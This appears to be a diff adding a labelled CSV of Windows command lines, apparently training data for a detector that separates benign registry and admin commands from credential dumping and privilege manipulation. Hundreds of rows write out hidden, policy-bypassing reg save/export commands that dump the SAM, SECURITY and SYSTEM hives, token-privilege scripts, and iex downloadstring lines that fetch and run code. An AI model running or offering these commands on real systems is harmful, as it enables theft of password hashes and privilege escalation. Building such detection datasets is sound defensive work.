@@ -1,0 +1,1142 @@
+text,label
+powershell -command reg.exe  save hklm\security  %temp%\sec_backup.dat,1
+import-module enable-privilege.ps1,2
+"reg.exe unload ""hkey_local_machine\software\microsoft\windows\currentversion"" /v version",0
+reg.exe save   hklm\sam \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c start /b reg.exe  save   hklm\security %temp%\sec_backup.dat,1
+powershell -command reg  export   hkey_local_machine\sam   \.\c$ackup.reg,1
+c:\windows\system32\cmd.exe /k reg save  hklm\sam  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg.exe save  hkey_local_machine\sam  c:\users\public\registry_export.reg   /y""",1
+"reg.exe query ""hku\software\microsoft\windows\currentversion"" /v path",0
+"reg.exe save ""hkey_local_machine\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"reg delete ""hkey_current_user\system\currentcontrolset\services"" /v version",0
+powershell -command reg.exe export  hkey_local_machine\system   %temp%\sec_backup.dat,1
+"reg.exe delete ""hkey_current_user\software\microsoft\windows\currentversion"" /v lastupdate",0
+powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
+cmd.exe /c reg.exe   save  hklm\system c:\users\public\registry_export.reg /y,1
+"reg.exe add ""hkey_users\software\google\chrome"" /v version",0
+"reg restore ""hkcu\software\policies\mycorp"" /v lastupdate",0
+powershell -exec bypass -w hidden -c reg.exe  save   hklm\system  c:\temp\system.hive  /y,1
+get-process,0
+powershell -exec bypass -w hidden -c reg  export   hklm\sam  c:\users\public\registry_export.reg /y,1
+powershell -ep bypass import-module .\set-tokenprivs.ps1,2
+"reg unload ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
+"reg.exe copy ""hkcu\control panel\desktop"" /v path",0
+powershell -exec bypass -w hidden -c reg  save  hklm\sam  %temp%\sec_backup.dat /y,1
+c:\windows\system32\cmd.exe /k reg.exe   export  hklm\system   c:\users\public\registry_export.reg,1
+cmd.exe /c start /b reg.exe  save   hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
+cmd.exe /c reg.exe   save hkey_local_machine\security   c:\temp\system.hive /y,1
+"reg restore ""hkey_current_user\software\microsoft\windows\currentversion"" ",0
+"start /b reg add ""hkey_users\software\policies\mycorp"" /v version",0
+"reg restore ""hkcu\control panel\desktop"" ",0
+powershell -command reg.exe  save hkey_local_machine\security c:\users\public\registry_export.reg,1
+pwsh -noprofile -c reg.exe   export   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak  /y,1
+"reg delete ""hkey_local_machine\software\policies\mycorp"" ",0
+c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\sam   \.\c$ackup.reg,1
+powershell -c .\enable-privilege.ps1,2
+powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak   /y,1
+reg  export  hklm\security   c:\windows\temp\sam.save,1
+"cmd /c powershell -c ""reg.exe  save  hklm\system  c:\temp\system.hive""",1
+pwsh -noprofile -c reg.exe save  hkey_local_machine\security  c:\windows\temp\sam.save /y,1
+powershell -command reg.exe save   hklm\sam  %temp%\sec_backup.dat,1
+"cmd /c powershell -c ""reg   save hklm\sam   c:\windows\temp\sam.save""",1
+import-module .\invoke-tokenmanipulation.ps1,2
+reg   export  hkey_local_machine\security %temp%\sec_backup.dat  /y,1
+"reg.exe restore ""hkey_users\control panel\desktop"" ",0
+"pwsh get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
+"reg.exe unload ""hkey_local_machine\software\policies\mycorp"" /f",0
+"cmd /c reg.exe delete ""hkey_current_user\control panel\desktop"" /v version",0
+powershell -c iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
+cmd.exe /c reg  save  hkey_local_machine\sam   \.\c$ackup.reg   /y,1
+cmd.exe /c start /b reg export   hkey_local_machine\security  %temp%\sec_backup.dat,1
+powershell -ep bypass .\set-tokenprivs.ps1,2
+"start /b reg.exe add ""hku\system\currentcontrolset\services"" /v lastupdate",0
+"cmd /c powershell -c ""reg.exe   export   hklm\sam \\localhost\c$\__dump\sam.bak /y""",1
+"reg unload ""hkey_users\software\policies\mycorp"" /v lastupdate",0
+"reg.exe query ""hkcu\software\google\chrome"" /f",0
+powershell -command reg.exe   export   hklm\system %temp%\sec_backup.dat,1
+c:\windows\system32\cmd.exe /k reg export hklm\sam   \.\c$ackup.reg,1
+start /b import-module activedirectory,0
+cmd.exe /c start /b reg.exe   save hklm\sam   c:\users\public\registry_export.reg,1
+"reg save ""hkey_current_user\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"cmd /c powershell -c ""reg.exe   export hklm\sam   \.\c$ackup.reg /y""",1
+"reg.exe save ""hkcu\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"reg.exe query ""hkey_users\system\currentcontrolset\services"" /v version",0
+"cmd /c powershell -c ""reg.exe export  hkey_local_machine\sam  c:\windows\temp\sam.save   /y""",1
+powershell -exec bypass -w hidden -c reg.exe  export hklm\system   %temp%\sec_backup.dat,1
+"start /b reg save ""hkey_current_user\control panel\desktop"" ""c:\temp\user_settings.reg""",0
+c:\windows\system32\cmd.exe /k reg.exe  save  hklm\system  c:\users\public\registry_export.reg  /y,1
+pwsh import-module .\set-tokenprivs.ps1,2
+.\update-system.ps1,0
+"reg.exe add ""hkey_local_machine\software\microsoft\windows\currentversion"" /v lastupdate",0
+pwsh -noprofile -c reg  save   hklm\system  c:\users\public\registry_export.reg  /y,1
+c:\windows\system32\cmd.exe /k reg save hkey_local_machine\security c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg   export   hklm\system  \.\c$ackup.reg /y,1
+"reg.exe copy ""hkey_users\software\policies\mycorp"" /f",0
+pwsh -noprofile -c reg export  hklm\sam \\localhost\c$\__dump\sam.bak,1
+pwsh -noprofile -c reg   save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
+powershell -exec bypass -w hidden -c reg.exe save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak  /y,1
+"powershell -c get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
+pwsh -noprofile -c reg.exe export hklm\system  \.\c$ackup.reg /y,1
+reg  save  hklm\security \.\c$ackup.reg   /y,1
+cmd.exe /c reg.exe  save   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
+get-date,0
+c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
+c:\windows\system32\cmd.exe /k reg save  hklm\security  \.\c$ackup.reg   /y,1
+cmd.exe /c start /b reg export  hklm\system   c:\windows\temp\sam.save,1
+"reg.exe unload ""hkey_local_machine\software\microsoft\windows\currentversion"" /f",0
+reg   save   hklm\system c:\users\public\registry_export.reg /y,1
+"reg query ""hkey_users\software\policies\mycorp"" ",0
+"cmd /c powershell -c ""reg   export hklm\system  c:\users\public\registry_export.reg""",1
+cmd /c powershell whoami /priv,2
+powershell -command reg  export   hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
+"reg add ""hkcu\system\currentcontrolset\services"" /v path",0
+powershell -command reg.exe  save hkey_local_machine\sam \.\c$ackup.reg,1
+powershell -c iex (new-object net.webclient).downloadstring('set-tokenprivs.ps1'),2
+"cmd /c powershell -c ""reg   save  hklm\security c:\windows\temp\sam.save""",1
+"reg add ""hkcu\software\google\chrome"" /v version",0
+"reg add ""hkey_local_machine\software\microsoft\windows\currentversion"" /v path",0
+cmd.exe /c start /b reg save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
+start /b hostname,0
+"cmd /c reg.exe compare ""hkey_local_machine\control panel\desktop"" /v path",0
+powershell -command reg.exe save   hklm\sam  c:\temp\system.hive,1
+"powershell -ep bypass get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
+cmd.exe /c start /b reg   save   hklm\sam  c:\users\public\registry_export.reg  /y,1
+powershell -exec bypass -w hidden -c reg.exe save   hklm\sam   c:\temp\system.hive,1
+"reg.exe unload ""hkey_users\software\google\chrome"" /v lastupdate",0
+powershell -command reg  export hkey_local_machine\sam  c:\users\public\registry_export.reg,1
+reg   export  hklm\sam   \\localhost\c$\__dump\sam.bak,1
+"cmd /c powershell get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
+powershell -command reg.exe   export hkey_local_machine\security   c:\windows\temp\sam.save   /y,1
+reg.exe export  hklm\system \\localhost\c$\__dump\sam.bak,1
+start /b import-module hyper-v,0
+c:\windows\system32\cmd.exe /k reg.exe   export  hklm\security   \.\c$ackup.reg,1
+powershell -command reg  save hkey_local_machine\security   %temp%\sec_backup.dat,1
+cmd /c powershell iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
+"cmd /c powershell -c ""reg.exe export hkey_local_machine\system   c:\windows\temp\sam.save  /y""",1
+"cmd /c powershell -c ""reg.exe export hklm\security c:\temp\system.hive""",1
+c:\windows\system32\cmd.exe /k reg export hkey_local_machine\sam \.\c$ackup.reg /y,1
+cmd.exe /c reg export  hklm\system \\localhost\c$\__dump\sam.bak,1
+"cmd /c powershell -c ""reg export hkey_local_machine\system \.\c$ackup.reg  /y""",1
+"reg.exe restore ""hkey_current_user\control panel\desktop"" /v version",0
+cmd.exe /c reg export hklm\security  c:\temp\system.hive   /y,1
+"cmd /c reg.exe save ""hkey_current_user\system\currentcontrolset\services"" ""c:\temp\user_settings.reg""",0
+c:\windows\system32\cmd.exe /k reg  export hklm\sam %temp%\sec_backup.dat /y,1
+powershell -command reg.exe save   hklm\system  c:\users\public\registry_export.reg  /y,1
+start /b import-module bitlocker,0
+c:\windows\system32\cmd.exe /k reg   export   hklm\security  c:\users\public\registry_export.reg  /y,1
+"reg.exe restore ""hkcu\software\microsoft\windows\currentversion"" /f",0
+cmd.exe /c reg.exe  export hklm\system \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c reg   save hklm\security  %temp%\sec_backup.dat /y,1
+cmd.exe /c reg export  hklm\system  c:\windows\temp\sam.save   /y,1
+powershell -exec bypass -w hidden -c reg.exe export hklm\sam c:\windows\temp\sam.save  /y,1
+cmd.exe /c start /b reg.exe   save hkey_local_machine\sam  c:\temp\system.hive,1
+cmd.exe /c start /b reg.exe  save   hklm\security  \\localhost\c$\__dump\sam.bak /y,1
+"powershell -c reg.exe compare ""hkcu\system\currentcontrolset\services"" /v path",0
+pwsh -noprofile -c reg   save   hklm\system  \\localhost\c$\__dump\sam.bak,1
+pwsh .\enable-privilege.ps1,2
+"cmd /c powershell -c ""reg.exe  save   hklm\security   c:\windows\temp\sam.save   /y""",1
+pwsh -noprofile -c reg.exe  export   hklm\sam c:\temp\system.hive,1
+reg  export   hklm\system %temp%\sec_backup.dat,1
+"reg restore ""hkey_users\software\microsoft\windows\currentversion"" /v path",0
+cmd /c import-module activedirectory,0
+c:\windows\system32\cmd.exe /k reg  save hkey_local_machine\security   %temp%\sec_backup.dat   /y,1
+cmd.exe /c start /b reg.exe  export  hkey_local_machine\security   c:\windows\temp\sam.save,1
+"reg.exe unload ""hkey_users\system\currentcontrolset\services"" /v lastupdate",0
+"reg.exe query ""hkey_current_user\system\currentcontrolset\services"" /v version",0
+"cmd /c powershell -c ""reg.exe save   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak""",1
+"reg.exe query ""hkey_users\software\microsoft\windows\currentversion"" /v lastupdate",0
+cmd.exe /c start /b reg.exe  save   hklm\security  c:\users\public\registry_export.reg,1
+"reg.exe save ""hkey_current_user\software\google\chrome"" ""c:\temp\user_settings.reg""",0
+"reg.exe unload ""hkey_current_user\system\currentcontrolset\services"" ",0
+powershell -exec bypass -w hidden -c reg.exe save  hklm\sam  c:\windows\temp\sam.save  /y,1
+cmd /c import-module hyper-v,0
+reg  save   hklm\sam  c:\temp\system.hive /y,1
+reg  save  hklm\security   \.\c$ackup.reg,1
+"reg.exe unload ""hkey_local_machine\system\currentcontrolset\services"" /f",0
+powershell -command reg  save hkey_local_machine\system  \.\c$ackup.reg,1
+reg.exe export hkey_local_machine\security   c:\users\public\registry_export.reg   /y,1
+"start /b reg.exe compare ""hkcu\software\google\chrome"" /v path",0
+powershell -exec bypass -w hidden -c reg.exe save   hkey_local_machine\sam  c:\windows\temp\sam.save,1
+cmd.exe /c start /b reg.exe   export hkey_local_machine\sam  c:\windows\temp\sam.save  /y,1
+"reg add ""hku\software\microsoft\windows\currentversion"" /v path",0
+"cmd /c powershell -c ""reg.exe export  hkey_local_machine\system  c:\temp\system.hive  /y""",1
+reg.exe  save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
+reg.exe   export  hkey_local_machine\sam   c:\windows\temp\sam.save,1
+"powershell -c get-process | select-object -property processname, @{name='setakeownershipprivilege';expression={$_.privilegestate}}",2
+powershell -command reg.exe   export hklm\system  \\localhost\c$\__dump\sam.bak,1
+"cmd /c powershell -c ""reg.exe   export hkey_local_machine\security   c:\users\public\registry_export.reg""",1
+"reg.exe save ""hkcu\software\google\chrome"" ""c:\users\public\chrome_data.bak""",0
+powershell -ep bypass whoami /priv,2
+reg  export hklm\security  \.\c$ackup.reg,1
+"reg.exe query ""hkcu\software\microsoft\windows\currentversion"" /v lastupdate",0
+"reg unload ""hkey_users\software\microsoft\windows\currentversion"" /v path",0
+reg.exe  export hklm\system c:\windows\temp\sam.save /y,1
+powershell -command reg   export   hkey_local_machine\sam  \.\c$ackup.reg,1
+"reg add ""hkey_local_machine\software\microsoft\windows\currentversion"" /f",0
+reg.exe  export hkey_local_machine\security c:\temp\system.hive /y,1
+powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\system %temp%\sec_backup.dat,1
+import-module bitlocker,0
+powershell -exec bypass -w hidden -c reg  export hklm\security   c:\users\public\registry_export.reg,1
+powershell -exec bypass -w hidden -c reg.exe save hkey_local_machine\security   \\localhost\c$\__dump\sam.bak  /y,1
+"reg.exe query ""hkey_local_machine\software\microsoft\windows\currentversion"" /v lastupdate",0
+"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\security   c:\users\public\registry_export.reg""",1
+powershell -command reg   export   hklm\sam c:\temp\system.hive   /y,1
+cmd.exe /c start /b reg.exe  export   hkey_local_machine\sam \.\c$ackup.reg /y,1
+powershell -ep bypass cmd.exe /c whoami /priv,2
+powershell -ep bypass import-module .\enable-privilege.ps1,2
+"cmd /c powershell -c ""reg   export hklm\system   c:\temp\system.hive /y""",1
+"reg restore ""hkey_current_user\software\google\chrome"" /v path",0
+"powershell -ep bypass get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
+"reg.exe query ""hkey_local_machine\control panel\desktop"" /v lastupdate",0
+powershell -c .\adjusttoken.ps1,2
+powershell -exec bypass -w hidden -c reg save   hklm\sam %temp%\sec_backup.dat  /y,1
+powershell -ep bypass .\adjusttoken.ps1,2
+"reg unload ""hkcu\software\microsoft\windows\currentversion"" /v lastupdate",0
+powershell -c whoami /priv,2
+"start /b reg save ""hkcu\system\currentcontrolset\services"" ""c:\temp\user_settings.reg""",0
+powershell -exec bypass -w hidden -c reg.exe  save  hklm\sam  c:\temp\system.hive,1
+cmd.exe /c start /b reg   export  hkey_local_machine\sam  c:\windows\temp\sam.save  /y,1
+"reg.exe compare ""hku\system\currentcontrolset\services"" /v version",0
+pwsh -noprofile -c reg.exe  save   hklm\system c:\temp\system.hive,1
+"powershell -c reg save ""hkcu\software\microsoft\windows\currentversion"" ""c:\users\public\chrome_data.bak""",0
+powershell -command reg save hklm\sam  \\localhost\c$\__dump\sam.bak,1
+c:\windows\system32\cmd.exe /k reg.exe  export hkey_local_machine\system %temp%\sec_backup.dat  /y,1
+cmd.exe /c start /b reg   save  hkey_local_machine\security   c:\temp\system.hive,1
+iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
+"start /b reg unload ""hkey_users\control panel\desktop"" /f",0
+c:\windows\system32\cmd.exe /k reg.exe save   hklm\security %temp%\sec_backup.dat  /y,1
+cmd.exe /c start /b reg.exe   export hkey_local_machine\security c:\windows\temp\sam.save /y,1
+cmd.exe /c reg   export  hklm\sam \\localhost\c$\__dump\sam.bak  /y,1
+cmd.exe /c reg   export   hklm\sam %temp%\sec_backup.dat,1
+"powershell -c reg.exe delete ""hkey_users\system\currentcontrolset\services"" /v lastupdate",0
+"reg compare ""hkey_users\system\currentcontrolset\services"" /f",0
+"reg.exe query ""hku\software\google\chrome"" ",0
+"cmd /c reg.exe copy ""hkcu\software\microsoft\windows\currentversion"" /v version",0
+cmd.exe /c reg.exe save   hklm\sam   c:\users\public\registry_export.reg /y,1
+reg  save hklm\sam  \\localhost\c$\__dump\sam.bak  /y,1
+"reg delete ""hkey_current_user\software\policies\mycorp"" /f",0
+reg export  hklm\security c:\windows\temp\sam.save  /y,1
+cmd.exe /c reg save hklm\security c:\windows\temp\sam.save,1
+"reg.exe restore ""hkey_local_machine\control panel\desktop"" /f",0
+echo check privileges,0
+powershell -exec bypass -w hidden -c reg.exe export  hklm\system   c:\temp\system.hive  /y,1
+c:\windows\system32\cmd.exe /k reg   save  hkey_local_machine\sam  c:\temp\system.hive,1
+"reg.exe save ""hkey_users\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
+"reg restore ""hkcu\software\policies\mycorp"" /v path",0
+cmd.exe /c start /b reg.exe  export   hklm\system  c:\windows\temp\sam.save  /y,1
+"reg delete ""hkey_users\software\microsoft\windows\currentversion"" /f",0
+powershell -command reg.exe  export   hklm\sam   c:\windows\temp\sam.save   /y,1
+"get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
+powershell -ep bypass import-module set-tokenprivs.ps1,2
+powershell -command reg.exe save  hklm\security \\localhost\c$\__dump\sam.bak /y,1
+powershell -command reg  save  hkey_local_machine\system %temp%\sec_backup.dat  /y,1
+"powershell -ep bypass get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
+cmd.exe /c start /b reg.exe   export hklm\sam  c:\users\public\registry_export.reg,1
+powershell -command reg.exe   export  hkey_local_machine\system  c:\windows\temp\sam.save  /y,1
+powershell -c .\enablealltokenprivs.ps1,2
+pwsh -noprofile -c reg   export   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
+pwsh -noprofile -c reg.exe   save  hklm\security   \.\c$ackup.reg /y,1
+cmd.exe /c start /b reg.exe  save   hkey_local_machine\security   c:\windows\temp\sam.save /y,1
+pwsh -noprofile -c reg.exe  export hkey_local_machine\system c:\users\public\registry_export.reg   /y,1
+pwsh -noprofile -c reg.exe  export hklm\security   c:\windows\temp\sam.save   /y,1
+reg.exe  export hkey_local_machine\system \.\c$ackup.reg /y,1
+.\enablealltokenprivs.ps1,2
+powershell -command reg.exe   export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak   /y,1
+powershell -c .\backup-daily.ps1,0
+pwsh -noprofile -c reg.exe export   hklm\security  c:\temp\system.hive   /y,1
+reg.exe  save  hkey_local_machine\security   %temp%\sec_backup.dat,1
+pwsh -noprofile -c reg  save hklm\system   \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c reg   save  hkey_local_machine\security  c:\windows\temp\sam.save /y,1
+powershell -command reg.exe   export hkey_local_machine\security   \.\c$ackup.reg   /y,1
+"cmd /c reg.exe unload ""hku\system\currentcontrolset\services"" /f",0
+"cmd /c powershell -c ""reg.exe export   hklm\security c:\temp\system.hive""",1
+pwsh -noprofile -c reg.exe save   hklm\security \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg.exe save  hkey_local_machine\sam   \.\c$ackup.reg   /y""",1
+pwsh iex (new-object net.webclient).downloadstring('invoke-tokenmanipulation.ps1'),2
+pwsh -noprofile -c reg   save hkey_local_machine\sam   c:\users\public\registry_export.reg,1
+c:\windows\system32\cmd.exe /k reg  export hkey_local_machine\system  c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe  export   hklm\system \\localhost\c$\__dump\sam.bak /y,1
+pwsh -noprofile -c reg.exe   export hkey_local_machine\sam \.\c$ackup.reg,1
+cmd.exe /c reg.exe   export hkey_local_machine\sam   \.\c$ackup.reg,1
+c:\windows\system32\cmd.exe /k reg.exe  export   hklm\security   %temp%\sec_backup.dat,1
+cmd.exe /c reg save hkey_local_machine\security c:\temp\system.hive,1
+reg   export  hklm\system  %temp%\sec_backup.dat /y,1
+cmd.exe /c reg.exe  save  hkey_local_machine\system c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe export  hklm\sam   c:\temp\system.hive,1
+pwsh -noprofile -c reg save hkey_local_machine\security c:\users\public\registry_export.reg,1
+cmd.exe /c start /b reg.exe save   hkey_local_machine\sam  c:\temp\system.hive,1
+c:\windows\system32\cmd.exe /k reg.exe save   hklm\security \\localhost\c$\__dump\sam.bak   /y,1
+powershell -exec bypass -w hidden -c reg export hklm\security   \.\c$ackup.reg /y,1
+"cmd /c powershell -c ""reg   export   hklm\system   c:\users\public\registry_export.reg /y""",1
+powershell -command reg save   hklm\security \.\c$ackup.reg   /y,1
+import-module .\enable-privilege.ps1,2
+"reg copy ""hku\system\currentcontrolset\services"" /v lastupdate",0
+powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\system  c:\temp\system.hive  /y,1
+c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\security c:\temp\system.hive  /y,1
+"cmd /c reg.exe add ""hkey_current_user\system\currentcontrolset\services"" /f",0
+c:\windows\system32\cmd.exe /k reg.exe   export hklm\system  c:\users\public\registry_export.reg /y,1
+reg  export hkey_local_machine\system   c:\temp\system.hive,1
+"cmd /c powershell -c ""reg.exe   save   hklm\sam %temp%\sec_backup.dat   /y""",1
+powershell -command reg.exe   save  hklm\sam  c:\temp\system.hive,1
+reg save  hklm\security  %temp%\sec_backup.dat  /y,1
+powershell -command reg   save hklm\sam  c:\users\public\registry_export.reg /y,1
+start /b .\check-diskspace.ps1,0
+reg.exe  export  hkey_local_machine\security  %temp%\sec_backup.dat /y,1
+c:\windows\system32\cmd.exe /k reg save  hklm\sam c:\temp\system.hive,1
+pwsh -noprofile -c reg   save   hklm\security c:\users\public\registry_export.reg,1
+"reg query ""hkey_current_user\software\microsoft\windows\currentversion"" ",0
+"cmd /c powershell -c ""reg.exe export  hklm\security  c:\windows\temp\sam.save""",1
+"reg.exe unload ""hkcu\software\policies\mycorp"" /v version",0
+powershell -exec bypass -w hidden -c reg save  hkey_local_machine\sam c:\windows\temp\sam.save,1
+powershell -c whoami /all,0
+"powershell -c reg compare ""hkey_current_user\software\policies\mycorp"" /f",0
+"cmd /c powershell -c ""reg.exe export   hkey_local_machine\system c:\users\public\registry_export.reg /y""",1
+"reg unload ""hku\system\currentcontrolset\services"" /f",0
+"start /b reg.exe add ""hkey_local_machine\software\policies\mycorp"" /v path",0
+cmd.exe /c reg   save hklm\sam  c:\temp\system.hive   /y,1
+cmd.exe /c start /b reg.exe save hkey_local_machine\sam   %temp%\sec_backup.dat  /y,1
+c:\windows\system32\cmd.exe /k reg   export   hkey_local_machine\system   %temp%\sec_backup.dat,1
+reg.exe  export  hklm\security  \.\c$ackup.reg  /y,1
+"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\security   %temp%\sec_backup.dat""",1
+"reg.exe unload ""hkey_local_machine\software\microsoft\windows\currentversion"" ",0
+cmd.exe /c reg.exe export   hklm\system   %temp%\sec_backup.dat,1
+reg.exe  save hkey_local_machine\security   %temp%\sec_backup.dat   /y,1
+pwsh -noprofile -c reg   save  hklm\system  \.\c$ackup.reg  /y,1
+c:\windows\system32\cmd.exe /k reg.exe   export   hklm\system c:\windows\temp\sam.save,1
+"reg.exe query ""hku\software\google\chrome"" /f",0
+"reg copy ""hkey_current_user\software\policies\mycorp"" /v path",0
+cmd.exe /c reg.exe export hklm\security c:\users\public\registry_export.reg   /y,1
+cmd.exe /c reg   save hklm\system %temp%\sec_backup.dat,1
+pwsh -noprofile -c reg.exe   export hkey_local_machine\system  c:\temp\system.hive   /y,1
+pwsh -noprofile -c reg.exe  save  hklm\sam  \\localhost\c$\__dump\sam.bak,1
+cmd.exe /c start /b reg.exe   save hklm\security  %temp%\sec_backup.dat   /y,1
+"cmd /c powershell -c ""reg.exe   export hklm\security c:\temp\system.hive   /y""",1
+get-service,0
+"reg unload ""hkcu\system\currentcontrolset\services"" /v version",0
+cmd.exe /c reg   save  hklm\system  c:\users\public\registry_export.reg  /y,1
+"reg unload ""hkey_local_machine\control panel\desktop"" /f",0
+"cmd /c reg compare ""hkey_local_machine\control panel\desktop"" /v path",0
+"reg.exe copy ""hkcu\system\currentcontrolset\services"" /v version",0
+import-module hyper-v,0
+"reg unload ""hkey_local_machine\software\policies\mycorp"" /v lastupdate",0
+"cmd /c reg.exe save ""hkcu\software\google\chrome"" ""c:\temp\user_settings.reg""",0
+powershell -c get-service,0
+powershell -exec bypass -w hidden -c reg  save hkey_local_machine\sam   c:\temp\system.hive,1
+powershell -exec bypass -w hidden -c reg   save   hklm\sam  %temp%\sec_backup.dat,1
+powershell -c import-module enable-privilege.ps1,2
+pwsh -noprofile -c reg.exe   export  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak  /y,1
+cmd /c get-process,0
+reg.exe  save  hkey_local_machine\security c:\windows\temp\sam.save,1
+whoami /all,0
+powershell -command reg   save   hklm\security   %temp%\sec_backup.dat,1
+pwsh -noprofile -c reg save  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak   /y,1
+cmd.exe /c reg   export  hklm\security  \.\c$ackup.reg /y,1
+"cmd /c powershell -c ""reg  save hklm\system  \.\c$ackup.reg   /y""",1
+cmd.exe /c start /b reg.exe save hklm\sam   \\localhost\c$\__dump\sam.bak  /y,1
+"reg delete ""hkcu\software\google\chrome"" ",0
+pwsh -noprofile -c reg.exe export hklm\sam \\localhost\c$\__dump\sam.bak,1
+reg.exe  export   hklm\sam  c:\windows\temp\sam.save,1
+cmd.exe /c reg save  hkey_local_machine\sam   c:\temp\system.hive  /y,1
+pwsh -noprofile -c reg   export hklm\sam  \.\c$ackup.reg,1
+cmd.exe /c reg.exe  export  hkey_local_machine\security   \.\c$ackup.reg,1
+"powershell -c reg query ""hkey_users\control panel\desktop"" /v path",0
+cmd.exe /c start /b reg.exe  save hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak   /y,1
+cmd.exe /c reg   save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
+pwsh -noprofile -c reg save  hkey_local_machine\sam \.\c$ackup.reg /y,1
+c:\windows\system32\cmd.exe /k reg  save  hklm\system  c:\windows\temp\sam.save  /y,1
+powershell -exec bypass -w hidden -c reg export  hkey_local_machine\system \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg export  hkey_local_machine\sam  c:\temp\system.hive /y""",1
+powershell -exec bypass -w hidden -c reg save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
+"powershell -c reg compare ""hkey_local_machine\control panel\desktop"" /v path",0
+"reg.exe unload ""hkcu\software\policies\mycorp"" /v path",0
+"reg copy ""hkcu\software\policies\mycorp"" /f",0
+start /b .\backup-daily.ps1,0
+"powershell -c reg.exe add ""hkey_users\system\currentcontrolset\services"" /v version",0
+"cmd /c powershell -c ""reg   export hklm\system c:\users\public\registry_export.reg /y""",1
+c:\windows\system32\cmd.exe /k reg  export   hklm\sam  c:\windows\temp\sam.save  /y,1
+"reg save ""hkey_local_machine\software\microsoft\windows\currentversion"" ""c:\users\public\chrome_data.bak""",0
+reg.exe  save   hklm\sam   c:\users\public\registry_export.reg,1
+cmd.exe /c start /b reg.exe  save   hklm\system   \.\c$ackup.reg   /y,1
+powershell -exec bypass -w hidden -c reg.exe  save   hklm\sam  \\localhost\c$\__dump\sam.bak /y,1
+powershell -command reg.exe  save   hklm\security  \\localhost\c$\__dump\sam.bak,1
+"reg.exe query ""hku\control panel\desktop"" /v path",0
+"reg compare ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
+"reg.exe restore ""hkey_current_user\software\policies\mycorp"" /v lastupdate",0
+"reg save ""hkey_current_user\software\microsoft\windows\currentversion"" ""c:\temp\user_settings.reg""",0
+powershell -c import-module adjusttoken.ps1,2
+powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\security  \.\c$ackup.reg,1
+"cmd /c powershell -c ""reg   export   hkey_local_machine\sam   c:\temp\system.hive  /y""",1
+import-module enablealltokenprivs.ps1,2
+c:\windows\system32\cmd.exe /k reg export hklm\security   %temp%\sec_backup.dat,1
+powershell -exec bypass -w hidden -c reg.exe export  hklm\system  \\localhost\c$\__dump\sam.bak   /y,1
+"reg.exe add ""hkcu\control panel\desktop"" /f",0
+cmd.exe /c start /b reg.exe   export  hklm\sam   c:\windows\temp\sam.save  /y,1
+c:\windows\system32\cmd.exe /k reg  export   hkey_local_machine\security c:\users\public\registry_export.reg /y,1
+powershell -c import-module .\invoke-tokenmanipulation.ps1,2
+cmd.exe /c start /b reg.exe export   hklm\security  \.\c$ackup.reg,1
+"powershell -c reg delete ""hkey_local_machine\software\google\chrome"" /v lastupdate",0
+"cmd /c powershell -c ""reg  save hkey_local_machine\system   c:\users\public\registry_export.reg  /y""",1
+"cmd /c reg copy ""hkey_current_user\system\currentcontrolset\services"" /v path",0
+cmd.exe /c start /b reg   export  hkey_local_machine\security  c:\users\public\registry_export.reg /y,1
+cmd.exe /c start /b reg  export hkey_local_machine\sam   c:\users\public\registry_export.reg,1
+"powershell -c reg.exe delete ""hkcu\software\policies\mycorp"" /f",0
+c:\windows\system32\cmd.exe /k reg export   hklm\system  c:\windows\temp\sam.save,1
+powershell -command reg.exe  export  hkey_local_machine\security   %temp%\sec_backup.dat,1
